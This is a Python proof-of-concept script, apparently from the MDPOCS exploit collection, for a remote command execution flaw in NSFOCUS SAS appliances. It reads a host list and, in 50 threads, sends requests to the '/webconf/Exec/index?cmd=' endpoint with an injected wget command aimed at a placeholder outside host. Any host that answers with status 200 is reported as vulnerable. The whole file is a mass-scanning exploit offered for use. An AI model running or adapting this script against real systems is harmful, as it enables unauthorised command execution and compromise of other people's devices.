#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# app="NSFOCUS-SAS"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 NsFocus_SAS_Exec_Rce_Poc.py url.txt                                               +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
requests.packages.urllib3.disable_warnings()

def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data;multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85",
        "Host": "%s" %host2
    }
    vulurl = url + "/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx"
    try:
        r = requests.get(vulurl, headers=headers,verify=False)
        if r.status_code==200 :
            print(url+" :true")    
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])